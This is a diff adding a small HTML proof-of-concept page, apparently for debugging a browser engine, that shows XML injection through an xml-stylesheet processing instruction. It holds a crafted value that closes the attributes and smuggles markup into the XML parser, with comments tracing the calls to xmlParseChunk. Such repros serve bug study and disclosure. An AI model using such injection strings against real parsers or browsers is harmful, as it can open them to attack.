@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>Processing Instruction XML Injection example</title>
+</head>
+<body>
+Please, attach debugger to this renderer process, set breakpoint for "xmlParseChunk" function and reload page.
+<script>
+	const processingInstruction = document.createProcessingInstruction('xml-stylesheet', 'type="text/css" /><!-- Attributes Closed There --><fake ');
+
+	// Append created processing instruction to document.
+	// This will make following calls:
+	// 1. ProcessingInstruction::InsertedInto(ContainerNode& insertion_point)
+	// 2. ProcessingInstruction::CheckStyleSheet(String& href, String& charset)
+	// 3. ParseAttributes(const String& string, bool& attrs_ok) -- Injection point there.
+	// 4. ParseChunk(xmlParserCtxtPtr ctxt, const String& chunk)
+	// 5. xmlParseChunk(xmlParserCtxtPtr ctxt, const char * chunk, int size, int terminate) -- Debugger attached to this function.
+	document.appendChild(processingInstruction);
+</script>
+</body>
+</html>
